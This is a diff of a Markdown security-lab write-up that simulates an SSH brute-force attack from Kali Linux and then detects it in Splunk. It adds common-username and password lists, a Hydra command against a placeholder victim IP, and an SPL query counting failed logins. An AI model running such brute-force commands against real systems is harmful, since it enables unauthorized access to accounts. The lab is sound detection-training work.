@@ -118,17 +118,50 @@ Universal Forwarder is lightweight and specifically designed to send logs.
 **Step 3: Attak Simulation** 
 
 From Kali Linux
-I created a field users commons
+
+I created a field of common users
 
 ```
 echo -e "root\nadmin\nuser\ntestuser" > users.txt
 ```
 
-# Crea un archivo de contraseñas comunes
-echo -e "password\n123456\nadmin\nletmein" > passwords.txt
+I created a file of common passwords.
 
-# Ejecuta Hydra
+```
+echo -e "password\n123456\nadmin\nletmein" > passwords.txt
+```
+
+Set up Hydra
+
+```
 hydra -L users.txt -P passwords.txt ssh://[IP_VICTIMA] -t 4 -V
+```
+## poner SS aqui
+
+***Why Hydra?***
+
+It is the industry standard tool for brute force attacks.
+
+```-t 4``` limits threads so as not to saturate (be “responsible” in the attack).
+```-V``` shows verbose to document the process.
+
+**Alternative rejected:** Medusa or Ncrack
+
+as Hydra has better documentation and is more recognized in professional reports.
+
+**Step 4: SPL queries in Splunk**
+
+   - *Query 1: Detect failed attempts*
+
+```spl
+index=main sourcetype=linux_secure "Failed password"
+| rex field=_raw "Failed password for (?<failed_user>\S+) from (?<src_ip>\S+)"
+| stats count by src_ip, failed_user
+| where count > 5
+| sort -count
+```
+
+
 
 
 ## Summary 
